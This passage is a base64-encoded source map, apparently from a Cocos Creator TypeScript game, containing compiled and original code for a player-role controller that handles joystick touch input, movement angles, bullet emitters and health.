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PQUFPLEVBQUMsQ0FBQzttREFDdkI7SUFHbkI7UUFEQyxRQUFRLENBQUMsRUFBQyxJQUFJLEVBQUMsRUFBRSxDQUFDLElBQUksRUFBRSxPQUFPLEVBQUMsUUFBUSxFQUFDLENBQUM7b0RBQ3ZCO0lBR3BCO1FBREMsUUFBUSxDQUFDLEVBQUMsSUFBSSxFQUFDLEVBQUUsQ0FBQyxJQUFJLENBQUMsWUFBWSxDQUFDLEVBQUUsT0FBTyxFQUFDLE1BQU0sRUFBQyxDQUFDOzREQUNSO0lBRy9DO1FBREMsUUFBUSxDQUFDLEVBQUMsSUFBSSxFQUFDLEVBQUUsQ0FBQyxJQUFJLENBQUMsYUFBYSxDQUFDLEVBQUUsT0FBTyxFQUFDLE1BQU0sRUFBQyxDQUFDOzZEQUNSO0lBMEJoRDtRQURDLFFBQVEsQ0FBQyxjQUFJLENBQUM7b0RBQ0U7SUFHakI7UUFEQyxRQUFRLENBQUMsMkJBQWlCLENBQUM7bUVBQ2lCO0lBM0U1QixrQkFBa0I7UUFEdEMsT0FBTztPQUNhLGtCQUFrQixDQSt4QnRDO0lBQUQseUJBQUM7Q0EveEJELEFBK3hCQyxDQS94QitDLEVBQUUsQ0FBQyxTQUFTLEdBK3hCM0Q7a0JBL3hCb0Isa0JBQWtCIiwiZmlsZSI6IiIsInNvdXJjZVJvb3QiOiIvIiwic291cmNlc0NvbnRlbnQiOlsiXHJcblxyXG5pbXBvcnQgQnVsbGV0RW1pdHRlclNoYW5EaWFuUWl1IGZyb20gXCIuLi9lbnRpdGllcy9idWxsZXRFbWl0dGVyL0J1bGxldEVtaXR0ZXJTaGFuRGlhblFpdVwiO1xyXG5pbXBvcnQgQnVsbGV0RW1pdHRlckh1b0ppYW5Ub25nIGZyb20gXCIuLi9lbnRpdGllcy9idWxsZXRFbWl0dGVyL0J1bGxldEVtaXR0ZXJIdW9KaWFuVG9uZ1wiO1xyXG5pbXBvcnQgQnVsbGV0RW1pdHRlclNob3VRaWFuZyBmcm9tIFwiLi4vZW50aXRpZXMvYnVsbGV0RW1pdHRlci9CdWxsZXRFbWl0dGVyU2hvdVFpYW5nXCI7XHJcbmltcG9ydCBCdWxsZXRFbWl0dGVyU2FuRGFuUWlhbmcgZnJvbSBcIi4uL2VudGl0aWVzL2J1bGxldEVtaXR0ZXIvQnVsbGV0RW1pdHRlclNhbkRhblFpYW5nXCI7XHJcbmltcG9ydCBSb2xlLCB7U3BlZWRUeXBlfSBmcm9tIFwiLi4vZW50aXRpZXMvcm9sZS9Sb2xlXCI7XHJcbmltcG9ydCBBY3Rpb25zIGZyb20gXCIuLi8uLi8uLi9mcmFtZXdvcmsvYWN0aW9ucy9BY3Rpb25zXCI7XHJcbmltcG9ydCBCdWxsZXRFbWl0dGVySmlHdWFuZyBmcm9tIFwiLi4vZW50aXRpZXMvYnVsbGV0RW1pdHRlci9CdWxsZXRFbWl0dGVySmlHdWFuZ1wiO1xyXG5pbXBvcnQgQnVsbGV0RW1pdHRlckxpWmlQYW8gZnJvbSBcIi4uL2VudGl0aWVzL2J1bGxldEVtaXR0ZXIvQnVsbGV0RW1pdHRlckxpWmlQYW9cIjtcclxuaW1wb3J0IEJ1bGxldEVtaXR0ZXJKaWFUZUxpbiBmcm9tIFwiLi4vZW50aXRpZXMvYnVsbGV0RW1pdHRlci9CdWxsZXRFbWl0dGVySmlhVGVMaW5cIjtcclxuaW1wb3J0IEJ1bGxldEVtaXR0ZXJKdUppUWlhbmcgZnJvbSBcIi4uL2VudGl0aWVzL2J1bGxldEVtaXR0ZXIvQnVsbGV0RW1pdHRlckp1SmlRaWFuZ1wiO1xyXG5pbXBvcnQgQnVsbGV0RW1pdHRlckh1b1lhbiBmcm9tIFwiLi4vZW50aXRpZXMvYnVsbGV0RW1pdHRlci9CdWxsZXRFbWl0dGVySHVvWWFuXCI7XHJcbmltcG9ydCBBQUJCUmVnaW9uIGZyb20gXCIuLi8uLi9xdWFkLXRyZWUvQUFCQlJlZ2lvblwiO1xyXG5pbXBvcnQgRW5lbXlBQUJCIGZyb20gXCIuLi9lbnRpdGllcy9lbmVteS9FbmVteUFBQkJcIjtcclxuaW1wb3J0IEJ1bGxldEVtaXR0ZXIgZnJvbSBcIi4uL2VudGl0aWVzL2J1bGxldEVtaXR0ZXIvQnVsbGV0RW1pdHRlclwiO1xyXG5pbXBvcnQgQnVsbGV0RW1pdHRlclBlblppIGZyb20gXCIuLi9lbnRpdGllcy9idWxsZXRFbWl0dGVyL0J1bGxldEVtaXR0ZXJQZW5aaVwiO1xyXG5pbXBvcnQge0dhbWVQcm94eX0gZnJvbSBcIi4vR2FtZVByb3h5XCI7XHJcbmltcG9ydCBFbmVteSBmcm9tIFwiLi4vZW50aXRpZXMvZW5lbXkvRW5lbXlcIjtcclxuaW1wb3J0IEJ1bGxldE9mRmFuZ0h1RHVuIGZyb20gXCIuLi9lbnRpdGllcy9idWxsZXQvQnVsbGV0T2ZGYW5nSHVEdW5cIjtcclxuaW1wb3J0IFByb3BCYXNlIGZyb20gXCIuLi9lbnRpdGllcy9wcm9wL1Byb3BCYXNlXCI7XHJcbmltcG9ydCBQcm9wU3RhdGVDb250cm9sbGVyIGZyb20gXCIuLi9lbnRpdGllcy9wcm9wL1Byb3BTdGF0ZUNvbnRyb2xsZXJcIjtcclxuaW1wb3J0IHtNdXNpY30gZnJvbSBcIi4uLy4uLy4uL2ZyYW1ld29yay9hdWRpby9NdXNpY1wiO1xyXG5pbXBvcnQge1dvcmxkfSBmcm9tIFwiLi4vaW5mby9Xb3JsZFwiO1xyXG5pbXBvcnQge0V4Y2VsQ29uZmlnfSBmcm9tIFwiLi4vLi4vLi4vZnJhbWV3b3JrL2NvbmZpZy9FeGNlbENvbmZpZ1wiO1xyXG5pbXBvcnQge0V4Y2VsVGFibGVOYW1lc30gZnJvbSBcIi4uL2NvbmZpZy9FeGNlbFRhYmxlTmFtZXNcIjtcclxuaW1wb3J0IEdhbWVDb250cm9sbGVyIGZyb20gXCIuL0dhbWVDb250cm9sbGVyXCI7XHJcbmltcG9ydCB7ZXh0fSBmcm9tIFwiLi4vLi4vLi4vZnJhbWV3b3JrL2V4dGVuZC9FeHRlbmRcIjtcclxuXHJcbmNvbnN0IHtjY2NsYXNzLCBwcm9wZXJ0eX0gPSBjYy5fZGVjb3JhdG9yO1xyXG5cclxuZXhwb3J0IGVudW0gSm95c3RpY2tUeXBlIHtcclxuICAgIEZJWEVELFxyXG4gICAgRk9MTE9XLFxyXG59XHJcblxyXG5leHBvcnQgZW51bSBEaXJlY3Rpb25UeXBle1xyXG4gICAgRk9VUiA9IDQsXHJcbiAgICBFSUdIVCA9IDgsXHJcbiAgICBBTEwgPSAwLFxyXG59XHJcblxyXG5jb25zdCBSSU5HX09QQUNJVFkgPSA4MDtcclxuXHJcbmNvbnN0IEVtaXR0ZXJTZnhWb2x1bWVzID0gWzAuMzMsIDAuOCwgMC44LCAwLjQ1LCAxLCAyLCAxLCAwLjYsIDEsIDIsIDEsIDEsIDFdO1xyXG5cclxuQGNjY2xhc3NcclxuZXhwb3J0IGRlZmF1bHQgY2xhc3MgR2FtZVJvbGVDb250cm9sbGVyIGV4dGVuZHMgY2MuQ29tcG9uZW50IHtcclxuXHJcbiAgICBAcHJvcGVydHkoY2MuTm9kZSlcclxuICAgIGd1aWRlTm9kZTpjYy5Ob2RlID0gbnVsbDtcclxuXHJcbiAgICBAcHJvcGVydHkoY2MuTm9kZSlcclxuICAgIGJ1bGxldFN0cmlrZUxheWVyOmNjLk5vZGUgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5QcmVmYWIpXHJcbiAgICBwcm9wU3RhdGVQcmVmYWI6Y2MuUHJlZmFiID0gbnVsbDtcclxuXHJcbiAgICBAcHJvcGVydHkoY2MuTm9kZSlcclxuICAgIHByb3BTdGF0ZU5vZGU6Y2MuTm9kZSA9IG51bGw7XHJcbiAgICBAcHJvcGVydHkoY2MuTm9kZSlcclxuICAgIHRha2VQcm9wTGF5ZXI6Y2MuTm9kZSA9IG51bGw7XHJcbiAgICBAcHJvcGVydHkoc3AuU2tlbGV0b24pXHJcbiAgICBiZUF0dGFja1NrZTpzcC5Ta2VsZXRvbiA9IG51bGw7XHJcblxyXG4gICAgQHByb3BlcnR5KHNwLlNrZWxldG9uKVxyXG4gICAgd2VhcG9uU2tlOnNwLlNrZWxldG9uID0gbnVsbDtcclxuXHJcbiAgICBAcHJvcGVydHkoY2MuTGFiZWwpXHJcbiAgICBwYXlsb2FkTGFiZWw6Y2MuTGFiZWwgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5Ob2RlKVxyXG4gICAgcGF5bG9hZEJhcnM6W2NjLk5vZGVdID0gW107XHJcblxyXG4gICAgQHByb3BlcnR5KGNjLlByb2dyZXNzQmFyKVxyXG4gICAgaHBQcm9ncmVzc0JhcjpjYy5Qcm9ncmVzc0JhciA9IG51bGw7XHJcblxyXG4gICAgQHByb3BlcnR5KGNjLk5vZGUpXHJcbiAgICBocEJhck5vZGU6Y2MuTm9kZSA9IG51bGw7XHJcblxyXG4gICAgQHByb3BlcnR5KGNjLk5vZGUpXHJcbiAgICBiZ0xheWVyOmNjLk5vZGUgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eSh7dHlwZTpjYy5Ob2RlLCB0b29sdGlwOlwi5pGH5p2G5pON57q154K5XCJ9KVxyXG4gICAgZG90OmNjLk5vZGUgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eSh7dHlwZTpjYy5Ob2RlLCB0b29sdGlwOlwi5pGH5p2G6IOM5pmv6IqC54K5XCJ9KVxyXG4gICAgcmluZzpjYy5Ob2RlID0gbnVsbDtcclxuXHJcbiAgICBAcHJvcGVydHkoe3R5cGU6Y2MuRW51bShKb3lzdGlja1R5cGUpLCB0b29sdGlwOlwi6Kem5pG457G75Z6LXCJ9KVxyXG4gICAgam95c3RpY2tUeXBlOkpveXN0aWNrVHlwZSA9IEpveXN0aWNrVHlwZS5GSVhFRDtcclxuXHJcbiAgICBAcHJvcGVydHkoe3R5cGU6Y2MuRW51bShEaXJlY3Rpb25UeXBlKSwgdG9vbHRpcDpcIuaWueWQkeexu+Wei1wifSlcclxuICAgIGRpcmVjdGlvblR5cGU6RGlyZWN0aW9uVHlwZSA9IERpcmVjdGlvblR5cGUuQUxMO1xyXG5cclxuICAgIHByaXZhdGUgX3JhZGl1cyA9IDA7XHJcblxyXG5cclxuICAgIHByaXZhdGUgX3Rha2VQcm9wczpBcnJheTxjYy5Ob2RlPiA9IFtdO1xyXG5cclxuICAgIHByaXZhdGUgZ2VuVGFrZVByb3BOb2RlKCk6Y2MuTm9kZXtcclxuICAgICAgICBsZXQgcHJlZmFiUGF0aCA9ICdwcmVmYWIvZW50aXRpZXMvcHJvcC90YWtlUHJvcCc7XHJcbiAgICAgICAgbGV0IGVudGl0eVByZWZhYiA9IGNjLmxvYWRlci5nZXRSZXMocHJlZmFiUGF0aCwgY2MuUHJlZmFiKTtcclxuICAgICAgICBsZXQgbm9kZSA9IGNjLmluc3RhbnRpYXRlKGVudGl0eVByZWZhYik7XHJcbiAgICAgICAgbm9kZS5hY3RpdmUgPSBmYWxzZTtcclxuICAgICAgICB0aGlzLnRha2VQcm9wTGF5ZXIuYWRkQ2hpbGQobm9kZSk7XHJcbiAgICAgICAgdGhpcy5fdGFrZVByb3BzLnB1c2gobm9kZSk7XHJcbiAgICAgICAgcmV0dXJuIG5vZGU7XHJcbiAgICB9XHJcblxyXG4gICAgcHJpdmF0ZSBnZXRJbmFjdGl2ZVRha2VQcm9wTm9kZSgpOmNjLk5vZGV7XHJcbiAgICAgICAgbGV0IHJlc3VsdDpjYy5Ob2RlID0gdGhpcy5fdGFrZVByb3BzLmZpbmQodmFsdWUgPT4gdmFsdWUuYWN0aXZlID09IGZhbHNlKTtcclxuICAgICAgICBpZiAodHlwZW9mIHJlc3VsdCA9PSBcInVuZGVmaW5lZFwiKXtcclxuICAgICAgICAgICAgcmVzdWx0ID0gdGhpcy5nZW5UYWtlUHJvcE5vZGUoKTtcclxuICAgICAgICB9XHJcbiAgICAgICAgcmV0dXJuIHJlc3VsdDtcclxuICAgIH1cclxuXHJcbiAgICBAcHJvcGVydHkoUm9sZSlcclxuICAgIHJvbGU6Um9sZSA9IG51bGw7XHJcblxyXG4gICAgQHByb3BlcnR5KEJ1bGxldE9mRmFuZ0h1RHVuKVxyXG4gICAgaW1wZW5ldHJhYmxlRGVmZW5jZTpCdWxsZXRPZkZhbmdIdUR1biA9IG51bGw7XHJcblxyXG4gICAgbWF4SHAgPSAxMDAwO1xyXG5cclxuICAgIHByaXZhdGUgX2hwID0gMDtcclxuXHJcblxyXG4gICAgZ2V0IGhwKCk6IG51bWJlciB7XHJcbiAgICAgICAgcmV0dXJuIHRoaXMuX2hwO1xyXG4gICAgfVxyXG5cclxuICAgIHNldCBocCh2YWx1ZTogbnVtYmVyKSB7XHJcbiAgICAgICAgaWYgKHRoaXMuaW1wZW5ldHJhYmxlRGVmZW5jZS5ub2RlLmFjdGl2ZSl7XHJcbiAgICAgICAgICAgIC8v5YeP6YCfXHJcbiAgICAgICAgICAgIHRoaXMuaW1wZW5ldHJhYmxlRGVmZW5jZS5zdHJpa2UobnVsbCwgbnVsbCk7XHJcb